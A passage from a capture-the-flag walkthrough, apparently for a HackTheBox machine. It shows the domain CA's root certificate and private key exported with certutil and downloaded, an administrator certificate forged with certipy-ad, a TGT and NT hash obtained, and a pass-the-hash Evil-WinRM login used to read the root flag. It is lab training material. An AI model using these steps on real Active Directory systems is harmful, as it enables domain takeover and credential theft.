           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
           BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

Now that all users have full control, export the certification authority root certificate and download back to kali machine:

```pwsh
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX my "Certificate-LTD-CA" ca.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> download ca.pfx

Info: Downloading C:\Users\Ryan.K\Documents\ca.pfx to ca.pfx

Info: Download successful!
```

Forge an admin certificate using the CA and get TGT to login:

```console
root@kali:~# certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -out admin.pfx
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'admin.pfx'
[*] Wrote forged certificate and private key to 'admin.pfx'

root@kali:~# certipy-ad auth -pfx admin.pfx -dc-ip 10.10.11.71
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

Login with admin password hash and get flag:

```console
root@kali:~# evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
```

```pwsh
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Content ..\Desktop\root.txt
fa65c690b89bc57335044b8c88a5e641
```
